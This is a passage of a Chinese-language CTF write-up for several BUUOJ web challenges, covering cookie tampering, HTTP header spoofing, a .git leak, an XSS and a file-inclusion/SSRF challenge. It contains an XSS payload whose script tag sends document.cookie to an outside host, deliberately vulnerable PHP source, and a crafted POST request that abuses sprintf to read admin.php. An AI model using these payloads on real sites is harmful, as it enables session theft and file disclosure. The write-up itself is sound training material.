class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be809d4c-8717-4842-bc82-61bf35da3a1d.node3.buuoj.cn&#x2F;test.php</span><br></pre></td></tr></table></figure><p>点击input</p><p>然后就开始爆破，发现是js写的，点击check，发现有cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dXNlcg&#x3D;MTU4MDMwODE2Ng&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64解密后，发现是unix时间戳，把他改小，发现成功率变大，改成负数，直到成功率到100以上。点check</p><p>得到密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Burst successed! The passwd is av11664517@1583985203.</span><br></pre></td></tr></table></figure><p>根据提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hint for Schrödinger]</span><br><span class="line">多注意cookie   </span><br><span class="line">最后密码是b站的av号 flag在b站上</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av11664517</span><br></pre></td></tr></table></figure><p>查看评论拿到flag</p><h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>打开是一个登入界面，除了admin都可以登录，登入会有跳转，抓包</p><p>发现最后有一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- L0g1n.php --&gt;</span><br></pre></td></tr></table></figure><p>于是访问<code>L0g1n.php</code></p><p>根据提示修改http header</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/L0g1n.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:25033</span><br><span class="line"><span class="attribute">User-Agent</span>: Contiki/1.0 (Commodore 64;http://dunkels.com/adam/contiki/)</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://node3.buuoj.cn:25033/</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Client-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">From</span>: root@gem-love.com</span><br><span class="line"><span class="attribute">Referer</span>: gem-love.com</span><br><span class="line"><span class="attribute">Via</span>: y1ng.vip</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4alc8h9smgnefqbeqd641mr7c1;time=158488078800</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>返回数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"gb2312"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>假猪套天下第一<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        *&#123;<span class="attribute">margin</span>:<span class="number">0px</span>; <span class="attribute">padding</span>:<span class="number">0px</span>;&#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.botCenter</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>; <span class="attribute">height</span>:<span class="number">35px</span>; <span class="attribute">line-height</span>:<span class="number">35px</span>; <span class="attribute">background</span>:<span class="number">#DDA0DD</span>; <span class="attribute">position</span>:fixed; <span class="attribute">bottom</span>:<span class="number">0px</span>; <span class="attribute">left</span>:<span class="number">0px</span>; <span class="attribute">font-size</span>:<span class="number">14px</span>; <span class="attribute">color</span>:<span class="number">#000</span>; <span class="attribute">text-align</span>:center;&#125;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">"#DDA0DD"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://gem-love.com/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"botCenter"</span>&gt;</span>@颖奇L'Amore<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">black</span> <span class="attr">size</span>=<span class="string">32px</span>&gt;</span></span><br><span class="line">        Sorry, even you are good at http header, you're still not my admin.<span class="tag">&lt;<span class="name">br</span>&gt;</span> Althoungh u found me, u still dont know where is flag <span class="comment">&lt;!--ZmxhZ3s1NWU5ZWI3ZC1jYTIwLTQ4YzQtYWFmZC1iYTJlNmJmZDFmNzR9Cg==--&gt;</span></span><br></pre></td></tr></table></figure><p>将base64解密即可</p><h2 id="xss之光"><a href="#xss之光" class="headerlink" title="xss之光"></a>xss之光</h2><p>.git泄露</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">dirb http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn CTF.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Mar 27 14:32:55 2020</span><br><span class="line">URL_BASE: http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn/</span><br><span class="line">WORDLIST_FILES: CTF.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 52</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn/ ----</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git (CODE:301|SIZE:185)</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/index (CODE:200|SIZE:118)</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/config (CODE:200|SIZE:137)</span><br><span class="line">+ http://e8807afa-b4d7-44d8-bd82-9d69dff7269c.node3.buuoj.cn//.git/ (CODE:403|SIZE:571)</span><br><span class="line">                                                                               e.php.swp</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Mar 27 14:32:57 2020</span><br><span class="line">DOWNLOADED: 52 - FOUND: 4</span><br></pre></td></tr></table></figure><p>利用githack得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure><p>利用php原生类进行xss读取cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"&lt;script src='http://1.1.1.1'+btoa(document.cookie)&gt;&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>本地cookie即可看见flag</p><h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><p>扫描发现有robots.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Disallow: &#x2F;flag.php</span><br><span class="line">Disallow: &#x2F;admin.php</span><br><span class="line">Allow: &#x2F;index.php</span><br></pre></td></tr></table></figure><p>http header有提示，访问home.php，url是下面这种形式，存在文件包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home.php?file&#x3D;system</span><br></pre></td></tr></table></figure><p>伪协议读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;home.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">setcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);</span><br><span class="line">setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;\^|\~|&amp;|\|&#x2F;&quot;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">        die(&quot;forbidden&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;.?a.?d.?m.?i.?n.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;You! are! not! my! admin!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(preg_match(&quot;&#x2F;^home$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">        die(&quot;禁止套娃&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;system$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;现在访问的是 &quot;.$file . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        require $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;location.href&#x3D;&#39;.&#x2F;home.php?file&#x3D;system&#39;&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;system.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;       Error:  url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;       Error:  damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;       Error:  request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);  &#x2F;&#x2F;</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;&#x2F;&#x2F;sprintf(format,arg1,arg2,arg++) 函数把格式化的字符串写入一个变量中。 此处$detect是字符串,传入的$method包含%s即可得到文件源码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 53</span><br><span class="line"><span class="attribute">Origin</span>: http://f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn/home.php?file=system</span><br><span class="line"><span class="attribute">Cookie</span>: y1ng=8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address=76d9f00467e5ee6abc3ca60892ef304e</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">q1=&amp;q2=http%3A%2F%2F127.0.0.1%2Fadmin.php?&amp;q3=POST%s%</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 